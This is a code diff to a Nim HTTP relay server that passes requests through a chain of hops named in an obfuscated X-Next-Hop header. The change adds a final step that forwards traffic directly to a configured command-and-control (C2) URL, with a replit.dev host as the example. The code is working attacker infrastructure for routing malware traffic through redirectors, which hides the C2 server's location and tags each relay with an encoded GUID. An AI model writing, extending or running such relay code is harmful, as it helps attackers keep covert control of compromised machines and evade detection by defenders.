@@ -1,6 +1,7 @@
 #[
     HTTP Relay Server - Async HTTP Server
     Forwards HTTP requests with X-Next-Hop header
+    When chain ends, forwards directly to C2
 ]#
 
 import asyncdispatch, asynchttpserver, strutils, base64, httpclient
@@ -40,13 +41,16 @@ proc encryptRelayGuid(guid: string): string =
     result = base64.encode(xored)
 
 # Async HTTP relay server
-proc startRelayServer*(port: int, relayGuid: string = "") {.async.} =
+# c2Url: Full C2 URL (e.g., "https://example.replit.dev:443")
+proc startRelayServer*(port: int, relayGuid: string = "", c2Url: string = "") {.async.} =
     when defined debug:
         echo "[RELAY] 🚀 Starting async HTTP relay server on port " & $port
+        if c2Url != "":
+            echo "[RELAY] 🎯 C2 target: " & c2Url
     
     var server = newAsyncHttpServer()
     
-    proc handleRequest(req: Request) {.async.} =
+    proc handleRequest(req: Request): Future[void] {.async, gcsafe.} =
         when defined debug:
             echo "[RELAY] 🔌 " & $req.reqMethod & " " & req.url.path & " from " & req.hostname
         
@@ -74,37 +78,62 @@ proc startRelayServer*(port: int, relayGuid: string = "") {.async.} =
             let (nextHop, remainingHops) = popNextHop(hopChain)
             
             when defined debug:
-                echo "[RELAY] ➡️  Forwarding to: " & nextHop
+                echo "[RELAY] ➡️  Next hop: " & nextHop
                 if remainingHops != "":
                     echo "[RELAY] 📝 Remaining hops: " & remainingHops
+                else:
+                    echo "[RELAY] ✅ End of chain - forwarding to C2"
             
-            # Build target URL
-            let targetUrl = "http://" & nextHop & req.url.path
+            # Determine target URL
+            var targetUrl: string
+            var fwdHeaders = newHttpHeaders()
             
-            # Create HTTP client
+            if remainingHops == "":
+                # End of chain - forward to C2
+                if c2Url == "":
+                    when defined debug:
+                        echo "[RELAY] ❌ No C2 URL configured"
+                    await req.respond(Http500, "No C2 configured")
+                    return
+                
+                targetUrl = c2Url & req.url.path
+                when defined debug:
+                    echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
+                
+                # Copy headers but remove relay-specific ones
+                for key, value in req.headers.pairs:
+                    let lowerKey = key.toLower()
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
+                        fwdHeaders[key] = value
+                
+                # Add X-Relay-GUID if we have one
+                if relayGuid != "":
+                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
+            else:
+                # More hops - forward to next relay
+                targetUrl = "http://" & remainingHops.split(",")[0] & req.url.path
+                when defined debug:
+                    echo "[RELAY] ↪️  Forwarding to next relay: " & targetUrl
+                
+                # Copy headers
+                for key, value in req.headers.pairs:
+                    let lowerKey = key.toLower()
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
+                        fwdHeaders[key] = value
+                
+                # Update X-Next-Hop with remaining hops
+                fwdHeaders["X-Next-Hop"] = encryptNextHop(remainingHops)
+                
+                # Add X-Relay-GUID if we have one
+                if relayGuid != "":
+                    fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
+            
+            # Create HTTP client and forward request
             var client = newAsyncHttpClient()
             
-            # Build forward headers
-            var fwdHeaders = newHttpHeaders()
-            for key, value in req.headers.pairs:
-                let lowerKey = key.toLower()
-                if lowerKey notin ["host", "connection", "content-length"]:
-                    fwdHeaders[key] = value
-            
-            # Update or remove X-Next-Hop
-            if remainingHops != "":
-                fwdHeaders["X-Next-Hop"] = encryptNextHop(remainingHops)
-            else:
-                fwdHeaders.del("X-Next-Hop")
-            
-            # Add X-Relay-GUID if we have one
-            if relayGuid != "":
-                fwdHeaders["X-Relay-GUID"] = encryptRelayGuid(relayGuid)
-            
             when defined debug:
-                echo "[RELAY] 📤 Forwarding to: " & targetUrl
+                echo "[RELAY] 📤 Sending request to: " & targetUrl
             
-            # Forward request
             let response = await client.request(targetUrl, httpMethod = HttpGet, headers = fwdHeaders)
             let responseBody = await response.body
             
